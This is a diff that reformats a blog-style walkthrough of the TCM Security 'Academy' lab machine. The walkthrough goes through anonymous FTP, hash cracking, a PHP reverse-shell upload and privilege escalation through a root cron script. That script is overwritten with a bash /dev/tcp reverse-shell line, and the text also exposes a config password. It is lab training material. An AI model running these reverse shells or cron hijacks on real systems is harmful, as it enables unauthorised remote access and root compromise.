@@ -1,10 +1,10 @@
 ---
-title: "Academy — Privilege Escalation & Exploitation Walkthrough (TCM Security)"
-date: "2025-11-13"
+title: 'Academy — Privilege Escalation & Exploitation Walkthrough (TCM Security)'
+date: '2025-11-13'
 draft: false
-tags: ["linux", "privilege-escalation", "web-exploitation", "reverse-shell"]
-summary: "Linux machine compromise via FTP anonymous access and web CMS exploitation, followed by privilege escalation through cron misconfiguration leading to root access."
-images: ["/static/images/academy/preview.png"]
+tags: ['linux', 'Machine', 'privilege-escalation', 'web-exploitation', 'reverse-shell']
+summary: 'Linux machine compromise via FTP anonymous access and web CMS exploitation, followed by privilege escalation through cron misconfiguration leading to root access.'
+images: ['/static/images/academy/preview.png']
 ---
 
 # Lab Setup:
@@ -20,6 +20,7 @@ Both the machine are on a NAT Network.
 ![academy](/static/images/academy/image%201.png)
 
 # Pinging
+
 To verify that the target machine was reachable from my attacking machine, I began by checking connectivity. If the host doesn’t respond to basic network checks, the assessment cannot proceed.
 
 ```bash
@@ -48,8 +49,8 @@ PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 |_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
-| ftp-syst: 
-|   STAT: 
+| ftp-syst:
+|   STAT:
 | FTP server status:
 |      Connected to ::ffff:10.0.2.4
 |      Logged in as ftp
@@ -62,7 +63,7 @@ PORT   STATE SERVICE VERSION
 |      vsFTPd 3.0.3 - secure, fast, stable
 |_End of status
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
 |   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
 |_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
@@ -84,6 +85,7 @@ HOP RTT     ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 35.25 seconds
 ```
+
 Nmap scan revealed three open ports: FTP (21), SSH (22), and HTTP (80). The FTP service was running vsftpd 3.0.3 and allowed anonymous login (FTP code 230). Inside the FTP directory, there is a note.txt, which appeared accessible without authentication. Before moving forward with deeper enumeration, I decided to retrieve and review this file, as such notes often provide useful clues or misconfigurations that can be leveraged later in the attack chain.
 
 ## FTP
@@ -95,7 +97,7 @@ Connected to 10.0.2.6.
 220 (vsFTPd 3.0.3)
 Name (10.0.2.152:kali): anonymous
 331 Please specify the password.
-Password: 
+Password:
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
@@ -105,9 +107,10 @@ ftp> ls
 -rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
 226 Directory send OK.
 ```
+
 I downloaded the 'note.txt' file from the FTP server to inspect its contents and determine whether it contained any useful information
 
-get the note.txt file 
+get the note.txt file
 
 ```bash
 ftp> get note.txt
@@ -125,15 +128,15 @@ ftp> exit
 Desktop  Documents  Downloads  Music  note.txt  Pictures  Public  Templates  Videos
 ```
 
-contents of the note.txt file 
+contents of the note.txt file
 
 ![academy](/static/images/academy/image%202.png)
 
-key information from the `note.txt` 
+key information from the `note.txt`
 
 password hash **`cd73502828457d15655bbd7a63fb0bc8`**
 
-student name **`Rum Ham`** 
+student name **`Rum Ham`**
 
 **The `note.txt` file contained several pieces of information that were immediately relevant. It included a password hash (`cd73502828457d15655bbd7a63fb0bc8`), the student name `‘Rum Ham’`, and a roll number of `10201321`. I noted these details for potential use during authentication or user‑based enumeration later in the assessment.**
 
@@ -141,7 +144,7 @@ student name **`Rum Ham`**
 
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ hash-identifier 
+└─$ hash-identifier
    #########################################################################
    #     __  __                     __           ______    _____           #
    #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
@@ -210,20 +213,19 @@ Least Possible Hashs:
 	Bye!
 ```
 
-This is a **`MD5 hash`** 
+This is a **`MD5 hash`**
 
 ### Crack the hash
 
 ![academy](/static/images/academy/image%203.png)
 
-the password is **`student`** 
+the password is **`student`**
 
 ## Web enumeration
 
 ![academy](/static/images/academy/image%204.png)
 
 The HTTP service only displayed the default Apache page, which indicated poor server hygiene and suggested that the organization had left services exposed without proper configuration. This indicates the pentester to look deeper into the web directory and underlying application structure.
- 
 
 ### Directory enumeration
 
@@ -231,12 +233,12 @@ The HTTP service only displayed the default Apache page, which indicated poor se
 ┌──(kali㉿kali)-[~]
 └─$ ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt:FUZZ -u http://10.0.2.6/FUZZ
 
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
 
        v2.1.0-dev
 ________________________________________________
@@ -278,7 +280,7 @@ Directory enumeration revealed two accessible paths: '/academy' and '/phpadmin'.
 
 ![academy](/static/images/academy/image%205.png)
 
-Navigating to '/academy' redirected me to a CMS login page. I used the credentials obtained from the 'note.txt', trying the combination '10201321:student'.*
+Navigating to '/academy' redirected me to a CMS login page. I used the credentials obtained from the 'note.txt', trying the combination '10201321:student'.\*
 
 The login attempt was successful.
 
@@ -290,7 +292,7 @@ Inside the CMS dashboard, there is a file upload feature. Since the application 
 
 ## Reverse shell
 
-I found this useful GitHub repository 
+I found this useful GitHub repository
 
 [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
 
@@ -312,12 +314,12 @@ Before moving forward, I 'stabilized the shell'. This step isn’t strictly requ
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 www-data@academy:/$ ^Z
 zsh: suspended  nc -lvnp 1234
-                                                                                                                                                              
+
 ┌──(kali㉿kali)-[~]
 └─$ stty raw -echo; fg
 [1]  + continued  nc -lvnp 1234
 
-www-data@academy:/$ 
+www-data@academy:/$
 ```
 
 # Privilege Escalation
@@ -342,24 +344,24 @@ After reviewing the 'linpeas.sh' output, I identified a password in a 'config.ph
 
 ![academy](/static/images/academy/image%2012.png)
 
-The username wasn’t listed. To identify the corresponding user, I inspected the configuration file directly. 
+The username wasn’t listed. To identify the corresponding user, I inspected the configuration file directly.
 
 ![academy](/static/images/academy/image%2013.png)
 
 Credentials: Username: 'grimmie' | Password: 'My_V3ryS3cur3_P4ss'
 I’ll attempt an SSH connection to the machine using these credentials.
 
-got the ssh connection 
+got the ssh connection
 
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ ssh grimmie@10.0.2.6  
+└─$ ssh grimmie@10.0.2.6
 The authenticity of host '10.0.2.6 (10.0.2.6)' can't be established.
 ED25519 key fingerprint is SHA256:eeNKTTakhvXyaWVPMDTB9+/4WEg6WKZwlUp0ATptgb0.
 This key is not known by any other names.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '10.0.2.6' (ED25519) to the list of known hosts.
-grimmie@10.0.2.6's password: 
+grimmie@10.0.2.6's password:
 Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -369,16 +371,16 @@ individual files in /usr/share/doc/*/copyright.
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 Last login: Sun May 30 03:21:39 2021 from 192.168.10.31
-grimmie@academy:~$ 
+grimmie@academy:~$
 grimmie@academy:~$ ls
 backup.sh
-grimmie@academy:~$ cat backup.sh 
+grimmie@academy:~$ cat backup.sh
 #!/bin/bash
 
 rm /tmp/backup.zip
 zip -r /tmp/backup.zip /var/www/html/academy/includes
 chmod 700 /tmp/backup.zip
-grimmie@academy:~$ 
+grimmie@academy:~$
 ```
 
 I found a script named 'backup.sh' in Grimmie’s account that creates a backup of '/var/www/html/academy/includes'. However, there were no user-level cron jobs linked to Grimmie, so I used 'pspy64' to investigate any system‑level scheduled tasks or background processes that might be triggering this script.
@@ -397,13 +399,13 @@ HTTP request sent, awaiting response... 200 OK
 Length: 3104768 (3.0M) [application/octet-stream]
 Saving to: ‘pspy64’
 
-pspy64                                  100%[=============================================================================>]   2.96M  69.8KB/s    in 34s     
+pspy64                                  100%[=============================================================================>]   2.96M  69.8KB/s    in 34s
 
 2025-11-27 08:57:45 (88.8 KB/s) - ‘pspy64’ saved [3104768/3104768]
 
-grimmie@academy:~$ ls 
+grimmie@academy:~$ ls
 backup.sh  pspy64
-grimmie@academy:~$ chmod +x pspy64 
+grimmie@academy:~$ chmod +x pspy64
 grimmie@academy:~$ ./pspy64
 ```
 
@@ -411,14 +413,12 @@ It’s clear that the script was being executed with elevated privileges. This m
 
 ![academy](/static/images/academy/image%2014.png)
 
-
 ```bash
-grimmie@academy:~$ cat backup.sh 
+grimmie@academy:~$ cat backup.sh
 #!/bin/bash
 
 bash -c 'sh -i >& /dev/tcp/10.0.2.4/9001 0>&1'
 ```
-
 
 ![academy](/static/images/academy/image%2015.png)
 
